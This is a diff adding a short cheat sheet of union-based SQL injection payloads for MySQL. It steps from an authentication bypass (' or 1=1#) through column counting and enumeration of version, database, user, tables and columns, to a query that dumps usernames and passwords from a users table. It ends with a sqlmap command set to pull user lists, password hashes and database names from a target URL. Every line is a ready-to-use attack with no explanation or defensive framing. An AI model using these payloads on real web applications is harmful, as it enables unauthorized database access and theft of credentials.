@@ -1,0 +1,20 @@
+[+] Union Based SQL Injection
+
+' or 1=1#
+
+1' ORDER BY 10#
+
+1' UNION SELECT version(),2#
+
+1' UNION SELECT version(),database()#
+
+1' UNION SELECT version(),user()#
+
+1' UNION ALL SELECT table_name,2 from information_schema.tables#
+
+1' UNION ALL SELECT column_name,2 from information_schema.columns where table_name = "users"#
+
+1' UNION ALL SELECT concat(user,char(58),password),2 from users#
+
+
+sqlmap --url="<url>" -p username --user-agent=SQLMAP --threads=10 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
